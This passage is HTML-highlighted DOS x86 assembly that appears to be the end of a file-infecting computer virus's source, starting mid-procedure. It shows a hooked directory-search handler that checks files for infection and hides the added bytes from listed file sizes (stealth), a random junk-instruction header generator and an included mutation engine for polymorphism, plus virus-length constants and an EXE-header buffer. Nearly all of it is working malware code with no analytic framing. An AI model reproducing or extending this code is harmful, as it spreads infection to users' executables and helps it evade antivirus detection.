       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.dtaSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.dtaSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> 
       </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">_done</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">test_infect</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">_done</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.dtaName</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3DC0h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">_done</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">11</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">read</span><span class="sc0">  
       </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">__close</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.dtaSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> 
       </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">__close</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.dtaSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.dtaSize</span><span class="sc4">],</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> 
</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc5">IntConst</span><span class="sc0">
</span><span class="sc5">_done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">done</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">__Err</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">Retf</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> 
</span><span class="sc5">find</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">garbage</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10001011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00010011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00100011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00001011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00101011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00011011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00110011b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10000101b</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00111011b</span><span class="sc0">
</span><span class="sc5">len_garbage</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">garbage</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">gen_header</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_byte</span><span class="sc0"> 
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">     
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">garbage</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">len_garbage</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111000b</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__4</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0"> 
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__3</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">gen_header</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">one_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">cmc</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">sahf</span><span class="sc0">
</span><span class="sc5">ob_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">one_byte</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">engine.inc</span><span class="sc0">

</span><span class="sc5">vl</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc4">:</span><span class="sc0">
 
</span><span class="sc5">exe_header</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">fsize1</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsize2</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Enun</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">stealth</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_ret</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buf_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">_vl</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
